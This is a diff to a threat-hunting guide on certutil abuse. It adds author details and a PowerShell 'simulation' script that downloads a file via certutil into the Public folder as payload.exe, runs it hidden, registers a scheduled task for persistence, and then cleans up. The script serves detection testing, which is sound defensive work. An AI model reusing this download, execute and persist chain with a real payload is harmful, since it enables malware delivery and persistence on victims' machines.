@@ -95,6 +95,59 @@ Prioritize endpoints with public folder .exe executions followed by outbound tra
 
 ✅ Hunting Goal: Identify and contain endpoints abusing certutil to fetch and launch malicious executables.
 
+## 👤 Created By
+
+* **Author**: Aduragbemi
+* **LinkedIn**: [Aduragbemi Oladapo](https://www.linkedin.com/in/aduragbemioladapo/)
+* **Date**: June 26, 2025
+
+---
+
+## ✅ Validated By
+
+* **Reviewer**: *TBD*
+* **Contact**: *TBD*
+* **Date**: *TBD*
+
+---
+💻 Simulation Script (Safe)
+```Powershell
+# Create a simulated payload URL and destination path
+$payloadUrl = "https://hel1-speed.hetzner.com/100MB.bin"
+$payloadPath = "$env:PUBLIC\payload.exe"
+
+# Use certutil.exe to download the "payload"
+Write-Host "[+] Downloading file using certutil..."
+Start-Process -FilePath "certutil.exe" -ArgumentList "-urlcache -split -f $payloadUrl `"$payloadPath`"" -Wait
+
+# Confirm file exists
+if (Test-Path $payloadPath) {
+    Write-Host "[+] Payload downloaded successfully: $payloadPath"
+} else {
+    Write-Host "[!] Failed to download payload."
+    exit
+}
+
+# Simulate execution of the payload
+Write-Host "[+] Simulating payload execution..."
+Start-Process -FilePath "$payloadPath" -WindowStyle Hidden
+
+# Simulate persistence using a scheduled task
+$taskName = "SimulatedPayloadTask"
+Write-Host "[+] Creating scheduled task for persistence..."
+schtasks /create /tn $taskName /tr "$payloadPath" /sc minute /mo 30 /f
+
+# Optional: Wait and then clean up
+Start-Sleep -Seconds 5
+Write-Host "[+] Cleaning up (Optional)..."
+schtasks /delete /tn $taskName /f
+Remove-Item $payloadPath -Force
+
+Write-Host "[+] Simulation completed."
+
+
+```
+
 ## 📅 Revision History
 
 | Version | Changes       | Date          | Modified By                |
